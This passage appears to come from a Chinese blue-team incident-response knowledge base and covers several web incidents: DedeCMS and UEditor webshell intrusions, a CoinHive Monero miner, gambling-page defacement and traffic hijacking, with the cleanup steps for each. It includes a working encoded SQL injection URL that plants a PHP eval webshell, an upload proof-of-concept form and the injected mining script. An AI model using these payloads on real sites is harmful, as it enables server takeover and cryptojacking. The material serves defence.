\uff083\uff09\u6267\u884cEXP\u540e\uff0c\u5c06\u5411\u6570\u636e\u5e93\u8868dede_mytag\u4e2d\u63d2\u5165\u4e00\u6761\u8bb0\u5f55\uff0c \uff084\uff09\u6267\u884c\u5982\u4e0b\u8bed\u53e5\uff0c\u5728/plus\u76ee\u5f55\u4e0b\u751f\u621090sec.php\u4e00\u53e5\u8bdd\u6728\u9a6c http://www.xxxx.com/plus/mytag_js.php?aid=9013 \u5229\u7528\u65b9\u5f0f\u4e09\uff1a\u4f7f/plus/ad_js.php\u6587\u4ef6\u53d8\u4e3a\u4e00\u53e5\u8bdd\u6728\u9a6cphp \uff081\uff09\u5982\uff1a\u6784\u9020\u5982\u4e0b\u6ce8\u5165SQL\u8bed\u53e5\uff1a cfg_dbprefixmyadSETnormbody= '<?php file_put_contents(''read.php'',''<?php eval($_POST[x]);echo mOon;?>'');?>' WHEREaid` =19 # \uff082\uff09\u5bf9\u5e94\u7684EXP: /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=114&arrs2[]=101&arrs2[]=97&arrs2[]=100&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 \uff083\uff09\u6267\u884cEXP\u540e\uff0c\u5c06\u5411\u6570\u636e\u5e93\u8868dede_myad\u4e2d\u63d2\u5165\u4e00\u6761\u8bb0\u5f55\u3002 \uff084\uff09\u8fdb\u4e00\u6b65\u8bbf\u95ee/plus/ad_js.php?aid=19 \u5373\u53ef\u5728plus\u76ee\u5f55\u751f\u6210read.php\u811a\u672c\u6587\u4ef6\u3002 \u5982\u4f55\u6e05\u9664\uff1f 1\u3001\u5220\u9664\u7f51\u7ad9\u76ee\u5f55\u4e2d\u7684webshell 2\u3001\u6e05\u9664dede_myad\u3001dede_mytag\u6570\u636e\u5e93\u8868\u4e2d\u63d2\u5165\u7684SQL\u8bed\u53e5\uff0c\u9632\u6b62\u518d\u6b21\u88ab\u8c03\u7528\u751f\u6210webshell\u3002 \u5982\u4f55\u9632\u5fa1\uff1f \u7f51\u7ad9\u91c7\u7528\u5f00\u6e90CMS\u642d\u5efa\uff0c\u5efa\u8bae\u53ca\u65f6\u5bf9\u5b98\u65b9\u53d1\u5e03\u7684\u7cfb\u7edf\u8865\u4e01\u4ee5\u53ca\u5185\u6838\u7248\u672c\u8fdb\u884c\u5347\u7ea7\u3002 \u7b2c9\u7bc7\uff1a\u7f16\u8f91\u5668\u5165\u4fb5\u4e8b\u4ef6 \u00b6 UEditor\u662f\u767e\u5ea6\u7684\u4e00\u4e2ajavascript\u7f16\u8f91\u5668\u7684\u5f00\u6e90\u9879\u76ee\uff0c\u5f88\u591a\u5f00\u53d1\u4eba\u5458\u90fd\u559c\u6b22\u5f15\u7528\u8fd9\u4e2a\u7f16\u8f91\u5668\uff0c\u4f46\u8fd9\u4e2a\u7f16\u8f91\u5668\u5b98\u7f51\u7248\u672c\u4e00\u76f4\u505c\u7559\u57282016-05-26\uff0c\u5df2\u7ecf\u5f88\u4e45\u6ca1\u6709\u66f4\u65b0\u4e86\u3002 0x01 \u73b0\u8c61\u63cf\u8ff0 \u00b6 HIDS\u9884\u8b66\uff1a\u53d1\u73b0\u540e\u95e8(Webshell)\u6587\u4ef6\uff0c\u5efa\u8bae\u60a8\u7acb\u5373\u8fdb\u884c\u5904\u7406\u3002 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 1\u3001\u53d1\u73b0Webshell \u901a\u8fc7\u9884\u8b66\u4fe1\u606f\uff0c\u627e\u5230\u6728\u9a6c\u6587\u4ef6\u8def\u5f84\uff1a \u5907\u6ce8\uff1a\u7d27\u6025\u5904\u7406\uff0c\u901a\u8fc7\u7981\u6b62\u52a8\u6001\u811a\u672c\u5728\u4e0a\u4f20\u76ee\u5f55\u7684\u8fd0\u884c\u6743\u9650\uff0c\u4f7fwebshell\u65e0\u6cd5\u6210\u529f\u6267\u884c\u3002 2\u3001\u5b9a\u4f4d\u6587\u4ef6\u4e0a\u4f20\u65f6\u95f4 \u6839\u636eWebshell\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\uff0c2020\u5e743\u67089\u65e5 15:08:34 3\u3001 Web\u8bbf\u95ee\u65e5\u5fd7\u5173\u8054\u5206\u6790 \u7531\u4e8e\uff0cIIS\u65e5\u5fd7\u65f6\u95f4\u4e0e\u7cfb\u7edf\u65f6\u95f4\u76f8\u5dee8\u5c0f\u65f6\uff0c\u7cfb\u7edf\u65f6\u95f4\u662f15:08\uff0c\u6211\u4eec\u8fd9\u91cc\u67e5\u770b\u7684\u662f 7:08\u7684\u65e5\u5fd7\u65f6\u95f4\u3002 2020-03-09 07:08:34 10.215.2.128 POST /ueditor/net/controller.ashx action=catchimage ................... ................... 2020-03-09 07:08:35 10.215.2.128 POST /ueditor/net/controller.ashx action=catchimage \u627e\u5230\u5bf9\u5e94\u7684\u7f51\u7ad9\u8bbf\u95ee\u65e5\u5fd7\uff0c\u5728\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\u9694\u95f4\u91cc\uff0c\u6211\u4eec\u4f1a\u6ce8\u610f\u5230\u8fd9\u6837\u4e24\u4e2aueditor\u7684\u8bbf\u95ee\u8bf7\u6c42\uff0c\u521d\u6b65\u6000\u7591\u662fUEditor\u7f16\u8f91\u5668\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002 4\u3001\u672c\u5730\u6f0f\u6d1e\u590d\u73b0 A\u3001\u672c\u5730\u6784\u5efa\u4e00\u4e2ahtml <form action=\"http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage\"enctype=\"application/x-www-form-urlencoded\" method=\"POST\"> <p>shell addr:<input type=\"text\" name=\"source[]\" /></p > <inputtype=\"submit\" value=\"Submit\" /> </form> B\u3001\u4e0a\u4f20webshell\uff0c\u4e0a\u4f20\u6210\u529f \u7ecf\u6f0f\u6d1e\u590d\u73b0\uff0c\u786e\u8ba4UEditor\u7f16\u8f91\u5668\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002 5\u3001\u8fd8\u539f\u653b\u51fb\u8005\u884c\u4e3a \u901a\u8fc7\u76f8\u5173\u6587\u4ef6\u7684\u8bbf\u95ee\u8bb0\u5f55\u8fdb\u884c\u5173\u8054\u5206\u6790\uff0c\u653b\u51fb\u8005\u901a\u8fc7 ueditor\u7f16\u8f91\u5668\u6210\u529f\u4e0a\u4f20webshell\u3002 0x03 \u4e8b\u4ef6\u5904\u7406 \u00b6 1\u3001 \u5220\u9664Webshell \u6e05\u695a\u5df2\u53d1\u73b0\u7684webshell\uff0c\u5e76\u5c1d\u8bd5\u67e5\u627e\u53ef\u80fd\u9690\u85cf\u7684webshell\u3002 2\u3001\u4ee3\u7801\u5b8c\u6574\u6027\u9a8c\u8bc1 \u6211\u4eec\u6765\u601d\u8003\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u679c\u6709\u4e00\u4e2a\u514d\u6740\u7684Webshell\u9690\u85cf\u5728\u6570\u4ee5\u4e07\u884c\u7684\u4ee3\u7801\u4e2d\uff0c\u600e\u4e48\u641e\uff1f \u6587\u4ef6\u5b8c\u6574\u6027\u6821\u9a8c\uff0c\u68c0\u67e5\u7f51\u7ad9\u7684\u6e90\u7801\u662f\u5426\u88ab\u7be1\u6539\u8fc7\u3002 \u64cd\u4f5c\u8fc7\u7a0b\uff1a \u901a\u8fc7\u67e5\u770b\u670d\u52a1\u5668\u4e0a\u5df2\u90e8\u7f72\u7684\u6e90\u4ee3\u7801\u7248\u672c\uff0c\u627e\u7814\u53d1\u540c\u4e8b\u8981\u540c\u6837\u7248\u672c\u7684\u4ee3\u7801\u3002\u628a\u7eaf\u51c0\u6e90\u7801\u7684\u6240\u6709\u6587\u4ef6\u8ba1\u7b97\u4e00\u6b21hash\u503c\u4fdd\u5b58\uff0c\u518d\u5230\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4e00\u6b21hash\u503c\uff0c\u901a\u8fc7\u6bd4\u5bf9hash\u503c\uff0c\u8f93\u51fa\u65b0\u521b\u5efa\u7684/\u88ab\u4fee\u6539\u8fc7\u7684/\u5220\u9664\u7684\u6587\u4ef6\u5217\u8868\u3002 3\u3001\u7cfb\u7edf\u5165\u4fb5\u6392\u67e5 \u5bf9\u7cfb\u7edf\u505a\u4e00\u4e2a\u6574\u4f53\u6392\u67e5\uff0c\u786e\u8ba4\u662f\u5426\u5b58\u5728\u540e\u95e8 4\u3001\u4ee3\u7801\u4fee\u590d \u53cd\u9988\u7ed9\u76f8\u5173\u5f00\u53d1\u4eba\u5458\u8fdb\u884c\u4ee3\u7801\u4fee\u590d\u3002","title":"Web\u5b9e\u6218"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_1","text":"\u7f51\u7ad9\u7ba1\u7406\u5458\u5728\u7ad9\u70b9\u76ee\u5f55\u4e0b\u53d1\u73b0\u5b58\u5728webshell\uff0c\u4e8e\u662f\u5f00\u59cb\u4e86\u5bf9\u5165\u4fb5\u8fc7\u7a0b\u5c55\u5f00\u4e86\u5206\u6790\u3002 Webshell\u67e5\u6740\u5de5\u5177\uff1a D\u76fe_Web\u67e5\u6740 Window\u4e0bwebshell\u67e5\u6740\uff1a http://www.d99net.net/index.asp \u6cb3\u9a6c\uff1a\u652f\u6301\u591a\u5e73\u53f0\uff0c\u4f46\u662f\u9700\u8981\u8054\u7f51\u73af\u5883\u3002 \u4f7f\u7528\u65b9\u6cd5: wget http://down.shellpub.com/hm/latest/hm-linux-amd64.tgz tar xvf hm-linux-amd64.tgz hm scan /www","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_2","text":"","title":"\u4e8b\u4ef6\u5206\u6790"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#1","text":"\u901a\u8fc7\u53d1\u73b0\u7684webshell\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\u70b9\uff0c\u53bb\u7ffb\u770b\u76f8\u5173\u65e5\u671f\u7684\u8bbf\u95ee\u65e5\u5fd7\u3002","title":"1\u3001 \u5b9a\u4f4d\u65f6\u95f4\u8303\u56f4"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#2web","text":"\u7ecf\u8fc7\u65e5\u5fd7\u5206\u6790\uff0c\u5728\u6587\u4ef6\u521b\u5efa\u7684\u65f6\u95f4\u8282\u70b9\u5e76\u672a\u53d1\u73b0\u53ef\u7591\u7684\u4e0a\u4f20\uff0c\u4f46\u53d1\u73b0\u5b58\u5728\u53ef\u7591\u7684webservice\u63a5\u53e3","title":"2\u3001Web \u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#3","text":"\u8bbf\u95eewebservice\u63a5\u53e3\uff0c\u53d1\u73b0\u53d8\u91cf\uff1abuffer\u3001distinctpach\u3001newfilename\u53ef\u4ee5\u5728\u5ba2\u6237\u7aef\u81ea\u5b9a\u4e49","title":"3\u3001\u6f0f\u6d1e\u5206\u6790"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#4","text":"\u5c1d\u8bd5\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u590d\u73b0\uff0c\u53ef\u6210\u529f\u4e0a\u4f20webshell\uff0c\u63a7\u5236\u7f51\u7ad9\u670d\u52a1\u5668","title":"4\u3001\u6f0f\u6d1e\u590d\u73b0"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#5","text":"\u6e05\u9664webshell\u5e76\u5bf9webservice\u63a5\u53e3\u8fdb\u884c\u4ee3\u7801\u4fee\u590d\u3002 \u4ece\u53d1\u73b0webshell\u5230\u65e5\u5fd7\u5206\u6790\uff0c\u518d\u5230\u6f0f\u6d1e\u590d\u73b0\u548c\u4fee\u590d\uff0c\u672c\u6587\u6682\u4e0d\u6d89\u53ca\u6eaf\u6e90\u53d6\u8bc1\u65b9\u9762\u3002","title":"5\u3001\u6f0f\u6d1e\u4fee\u590d"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#2","text":"\u95e8\u7f57\u5e01(Monero \u6216 XMR)\uff0c\u5b83\u662f\u4e00\u4e2a\u975e\u5e38\u6ce8\u91cd\u4e8e\u9690\u79c1\u3001\u533f\u540d\u6027\u548c\u4e0d\u53ef\u8ddf\u8e2a\u7684\u52a0\u5bc6\u6570\u5b57\u8d27\u5e01\u3002\u53ea\u9700\u5728\u7f51\u9875\u4e2d\u914d\u7f6e\u597djs\u811a\u672c\uff0c\u6253\u5f00\u7f51\u9875\u5c31\u53ef\u4ee5\u6316\u77ff\uff0c\u662f\u4e00\u79cd\u975e\u5e38\u7b80\u5355\u7684\u6316\u77ff\u65b9\u5f0f\uff0c\u800c\u901a\u8fc7\u8fd9\u79cd\u6076\u610f\u6316\u77ff\u83b7\u53d6\u6570\u5b57\u8d27\u5e01\u662f\u9ed1\u7070\u8272\u4ea7\u4e1a\u83b7\u53d6\u6536\u76ca\u7684\u91cd\u8981\u9014\u5f84\u3002","title":"\u7b2c2\u7bc7\uff1a\u95e8\u7f57\u5e01\u6076\u610f\u6316\u77ff"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_3","text":"\u5229\u7528XMR\u6076\u610f\u6316\u77ff\uff0c\u4f1a\u5927\u91cf\u5360\u7528\u7528\u6237\u7684CPU\u8d44\u6e90\uff0c\u4e25\u91cd\u5f71\u54cd\u4e86\u7f51\u7ad9\u7684\u7528\u6237\u4f53\u9a8c\u3002 \u4ece08/09\u65e50\u70b9\u5f00\u59cb\uff0c\u5c40\u57df\u7f51\u5185\u67d0IP\u8bbf\u95ee\u7f51\u7ad9\u9875\u9762\u4f1a\u89e6\u53d1\u5b89\u5168\u9884\u8b66\uff0c\u53ea\u8981\u8bbf\u95ee\u6b64\u670d\u52a1\u5668\u4e0a\u7684\u7f51\u9875\uff0cCPU\u76f4\u7ebf\u4e0a\u5347100%","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_4","text":"\u901a\u8fc7\u83b7\u53d6\u6076\u610f\u7f51\u9875url\uff0c\u5bf9\u7f51\u9875\u9875\u9762\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u7f51\u7ad9\u9875\u9762\u88ab\u690d\u5165\u5728\u7ebf\u95e8\u7f57\u5e01\u6316\u77ff\u4ee3\u7801\uff1a var script = document.createElement('script'); script.onload = function () { // XMR Pool hash var m = new CoinHive.Anonymous('BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu'); // TODO: Replace the below string with wallet string m.start('47DuVLx9UuD1gEk3M4Wge1BwQyadQs5fTew8Q3Cxi95c8W7tKTXykgDfj7HVr9aCzzUNb9vA6eZ3eJCXE9yzhmTn1bjACGK'); }; script.src = 'https://coinhive.com/lib/coinhive.min.js'; document.head.appendChild(script); \u5220\u9664js\u91cc\u9762\u7684\u6076\u610f\u4ee3\u7801\uff0c\u7f51\u7ad9\u88abXMR \u6076\u610f\u6316\u77ff\uff0c\u670d\u52a1\u5668\u5df2\u7ecf\u88ab\u653b\u51fb\uff0c\u8fdb\u4e00\u6b65\u505a\u670d\u52a1\u5668\u5165\u4fb5\u6392\u67e5\u3002","title":"\u95ee\u9898\u89e3\u6790"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#3_1","text":"\u4f5c\u4e3a\u4e00\u4e2a\u7f51\u7ad9\u7ba1\u7406\u5458\uff0c\u4f60\u91c7\u7528\u5f00\u6e90CMS\u505a\u7f51\u7ad9\uff0c\u6bd4\u5982dedecms\uff0c\u4f46\u662f\u6709\u4e00\u5929\uff0c\u4f60\u5ffd\u7136\u53d1\u73b0\u4e0d\u77e5\u4f55\u65f6\uff0c\u7f51\u7ad9\u7684\u53cb\u60c5\u94fe\u63a5\u6a21\u5757\u88ab\u6302\u5927\u91cf\u5783\u573e\u94fe\u63a5\uff0c\u7f51\u7ad9\u51fa\u73b0\u4e86\u5f88\u591a\u4e0d\u8be5\u6709\u7684\u76ee\u5f55\uff0c\u91cc\u9762\u5168\u662f\u535a\u5f69\u76f8\u5173\u7684\u7f51\u9875\u3002\u800c\u4e14\uff0c\u653b\u51fb\u8005\u5728\u6302\u9ed1\u9875\u4ee5\u540e\uff0c\u4f1a\u5728\u4e00\u4e9b\u5c0f\u8bba\u575b\u6ce8\u518c\u9a6c\u7532\u5c06\u4f60\u7684\u7f51\u7ad9\u9ed1\u9875\u94fe\u63a5\u53d1\u5230\u8bba\u575b\uff0c\u5f15\u722c\u866b\u6536\u5f55\u3002\u5728\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u7f51\u7ad9\u5730\u5740\u65f6\uff0c\u6536\u5f55\u4e86\u4e00\u4e9b\u4f1a\u51fa\u73b0\u4e00\u4e9b\u535a\u5f69\u9875\u9762\uff0c\u4e25\u91cd\u5f71\u54cd\u4e86\u7f51\u7ad9\u5f62\u8c61\u3002","title":"\u7b2c3\u7bc7\uff1a\u6279\u91cf\u6302\u9ed1\u9875"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_5","text":"\u7f51\u7ad9\u5b58\u5728\u9ad8\u5371\u6f0f\u6d1e\uff0c\u5e38\u89c1\u4e8e\u4e00\u4e9b\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u7684\u5f00\u6e90CMS\uff0c\u5229\u75280day\u6279\u91cf\u62ff\u7ad9\u4e0a\u4f20\u9ed1\u9875\u3002","title":"\u539f\u56e0\u5206\u6790"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_6","text":"\u67d0\u7f51\u7ad9\u88ab\u6302\u4e86\u975e\u5e38\u591a\u535a\u5f69\u94fe\u63a5\uff0c\u94fe\u63a5\u5f62\u5f0f\u5982\u4e0b\uff1a http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html http://www.xxx.com/upload/aomendduchangzaixian/index.html http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html \u94fe\u63a5\u53ef\u4ee5\u8bbf\u95ee\uff0c\u76f4\u63a5\u8bbf\u95ee\u7269\u7406\u8def\u5f84\u4e5f\u53ef\u4ee5\u770b\u5230\u6587\u4ef6\uff0c\u4f46\u662f\u6253\u5f00\u7f51\u7ad9\u76ee\u5f55\u5e76\u6ca1\u6709\u53d1\u73b0\u8fd9\u4e9b\u6587\u4ef6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u5230\u5e95\u85cf\u5728\u4e86\u54ea\uff1f \u8bbf\u95ee\u8fd9\u4e9b\u94fe\u63a5\uff0c\u8df3\u8f6c\u5230\u5982\u56fe\u9875\u9762\uff1a","title":"\u73b0\u8c61\u63cf\u8ff0\uff1a"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_7","text":"1\u3001\u6253\u5f00\u7535\u8111\u6587\u4ef6\u5939\u9009\u9879\u5361\uff0c\u53d6\u6d88\u201d\u9690\u85cf\u53d7\u4fdd\u62a4\u7684\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6\u201c\u52fe\u9009\uff0c\u628a\u201d\u9690\u85cf\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u201c\u4e0b\u9762\u7684\u5355\u9009\u9009\u62e9\u201c\u663e\u793a\u9690\u85cf\u7684\u6587\u4ef6\u3001\u6587\u4ef6\u5939\u548c\u9a71\u52a8\u5668\u201d\u3002 2\u3001\u518d\u6b21\u67e5\u770b\uff0c\u53ef\u4ee5\u770b\u5230\u534a\u900f\u660e\u7684\u6587\u4ef6\u5939\uff0c\u6e05\u695a\u9690\u85cf\u6587\u4ef6\u5939\u53ca\u6240\u6709\u9875\u9762 3\u3001\u7136\u540e\u6e05\u9664IIS\u4e34\u65f6\u538b\u7f29\u6587\u4ef6 C:\\inetpub\\temp\\IIS Temporary Compressed Files\\WEBUI$ _gzip_D \\WEB\\WEBUI\\UPLOAD 4\u3001\u6295\u8bc9\u5feb\u7167\uff0c\u7533\u8bf7\u5220\u9664\u76f8\u5173\u7684\u7f51\u9875\u6536\u5f55\uff0c\u51cf\u5c11\u5bf9\u7f51\u7ad9\u7684\u5f71\u54cd\u3002","title":"\u95ee\u9898\u5904\u7406\uff1a"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#4_1","text":"\u65b0\u95fb\u6e90\u7f51\u7ad9\u4e00\u822c\u6743\u91cd\u8f83\u9ad8\uff0c\u6536\u5f55\u5feb\uff0c\u80fd\u591f\u88ab\u641c\u7d22\u5f15\u64ce\u4f18\u5148\u6536\u5f55\uff0c\u662f\u9ed1\u7070\u4ea7\u63a8\u5e7f\u5f15\u6d41\u7684\u5fc5\u4e89\u4e4b\u5730\uff0c\u5f88\u5bb9\u6613\u6210\u4e3a\u88ab\u653b\u51fb\u7684\u5bf9\u8c61\u3002\u88ab\u9ed1\u4ee5\u540e\u4e3b\u8981\u6302\u7684\u4e0d\u826f\u4fe1\u606f\u5185\u5bb9\u4e3b\u8981\u662f\u535a\u5f69\u516d\u5408\u5f69\u7b49\u8d4c\u535a\u7c7b\u5185\u5bb9\uff0c\u65b0\u95fb\u6e90\u7f51\u7ad9\u7a0b\u5e8f\u65e0\u8bba\u662f\u81ea\u4e3b\u5f00\u53d1\u7684\u8fd8\u662f\u5f00\u6e90\u7a0b\u5e8f\uff0c\u90fd\u6709\u88ab\u9ed1\u7684\u53ef\u80fd\uff0c\u5f00\u6e90\u7a0b\u5e8f\u66f4\u5bb9\u6613\u88ab\u9ed1\u3002","title":"\u7b2c4\u7bc7\uff1a\u65b0\u95fb\u6e90\u7f51\u7ad9\u52ab\u6301"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_8","text":"\u67d0\u65b0\u95fb\u6e90\u7f51\u7ad9\u9996\u9875\u5e7f\u544a\u94fe\u63a5\u88ab\u52ab\u6301\u5230\u83e0\u83dc\u7f51\u7ad9 \u6709\u4e09\u4e2a\u5e7f\u544a\u4e13\u9898\uff0c\u94fe\u63a5\u5f62\u5f0f\u5982\u4e0b\uff1a http://www.xxx.cn/zhuanti/yyysc/index.shtml http://www.xxx.cn/zhuanti/wwwsc/index.shtml http://www.xxx.cn/zhuanti/zzzsc/index.shtml \u70b9\u51fb\u8fd9\u4e09\u6761\u94fe\u63a5\u4f1a\u8df3\u8f6c\u5230\u535a\u5f69\u7f51\u7ad9\u3002\u7b80\u5355\u6293\u5305\u5206\u6790\u4e00\u4e0b\u8fc7\u7a0b\uff1a \u53ef\u4ee5\u53d1\u73b0\u6b64\u65f6\u8fd9\u4e2a\u8fd4\u56de\u9875\u9762\u5df2\u88ab\u52ab\u6301\uff0c\u5e76\u4e14\u52a0\u8f7d\u4e86\u7b2c\u4e09\u65b9js\u6587\u4ef6\uff0c http://xn--dpqw2zokj.com/N/js/dt.js \uff0c\u8fdb\u4e00\u6b65\u8bbf\u95ee\u8be5\u6587\u4ef6\uff1a dt.js\u8fdb\u4e00\u6b65\u52a0\u8f7d\u4e86\u53e6\u4e00\u6761js\uff0c\u8bbf\u95eehttp://xn--dpqw2zokj.com/N/js/yz.js \u6211\u4eec\u53d1\u73b0\u94fe\u63a5\u8df3\u8f6c\u5230https://lemcoo.com/?dt\uff0c\u8fdb\u4e00\u6b65\u8bbf\u95ee\u8fd9\u4e2a\u94fe\u63a5\uff0c\u7f51\u7ad9\u4e3a\u535a\u5f69\u94fe\u63a5\u5bfc\u822a\u7f51\u7ad9\uff0c\u8bbf\u95ee\u540e\u4f1a\u968f\u673a\u8df3\u8f6c\u5230\u7b2c\u4e09\u65b9\u8d4c\u535a\u7f51\u7ad9\u3002","title":"\u73b0\u8c61\u63cf\u8ff0\uff1a"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_9","text":"\u627e\u5230url\u5bf9\u5e94\u7684\u6587\u4ef6\u4f4d\u7f6e\uff0c\u5373\u4f7f\u6587\u4ef6\u88ab\u5220\u9664\uff0c\u94fe\u63a5\u4f9d\u7136\u53ef\u4ee5\u8bbf\u95ee\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e09\u6761\u94fe\u63a5\u90fd\u662f\u4ee5\u201csc\u201d\u540e\u7f00\u3002 \u5bf9Nginx\u914d\u7f6e\u6587\u4ef6\u8fdb\u884c\u6392\u67e5\uff0c\u53d1\u73b0Nginx\u914d\u7f6e\u6587\u4ef6VirtualHost.conf\u88ab\u7be1\u6539\uff0c\u901a\u8fc7\u53cd\u5411\u4ee3\u7406\u5339\u914d\u4ee5\u201csc\u201d\u540e\u7f00\u7684\u4e13\u9898\u94fe\u63a5\uff0c\u52ab\u6301\u5230 http://103.233.248.163 \uff0c\u8be5\u7f51\u7ad9\u4e3a\u535a\u5f69\u94fe\u63a5\u5bfc\u822a\u7f51\u7ad9\u3002 \u5220\u9664\u6076\u610f\u4ee3\u7406\u540e\uff0c\u4e13\u9898\u94fe\u63a5\u8bbf\u95ee\u6062\u590d\u3002","title":"\u95ee\u9898\u5904\u7406\uff1a"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#5_1","text":"PC\u7aef\u8bbf\u95ee\u6b63\u5e38\uff0c\u79fb\u52a8\u7aef\u8bbf\u95ee\u51fa\u73b0\u5f02\u5e38\uff0c\u6bd4\u5982\u63d2\u5165\u5f39\u7a97\u3001\u5d4c\u5165\u5f0f\u5e7f\u544a\u548c\u8df3\u8f6c\u5230\u7b2c\u4e09\u65b9\u7f51\u7ad9\uff0c\u5c06\u5e72\u6270\u7528\u6237\u7684\u6b63\u5e38\u4f7f\u7528\uff0c\u5bf9\u7528\u6237\u4f53\u9a8c\u9020\u6210\u6781\u5927\u4f24\u5bb3\u3002","title":"\u7b2c5\u7bc7\uff1a\u79fb\u52a8\u7aef\u52ab\u6301"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_10","text":"\u90e8\u5206\u7f51\u7ad9\u7528\u6237\u53cd\u9988\uff0c\u624b\u673a\u6253\u5f00\u7f51\u7ad9\u5c31\u4f1a\u8df3\u8f6c\u5230\u8d4c\u535a\u7f51\u7ad9\u3002","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/#_11","text":"\u8bbf\u95ee\u7f51\u7ad9\u9996\u9875\uff0c\u6293\u53d6\u5230\u4e86\u4e00\u6761\u6076\u610fjs\uff1a http://js.zadovosnjppnywuz.com/caonima.js \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u8fd9\u6bb5js\u4ee3\u7801\u5224\u65ad\u624b\u673a\u8bbf\u95ee\u6765\u6e90\uff0c\u52ab\u6301\u79fb\u52a8\u7aef\uff08\u5982\u624b\u673a\u3001ipad\u3001Android\u7b49\uff09\u6d41\u91cf\uff0c\u8df3\u8f6c\u5230 https://262706.com\u3002 \u8fdb\u4e00\u6b65\u8bbf\u95ee 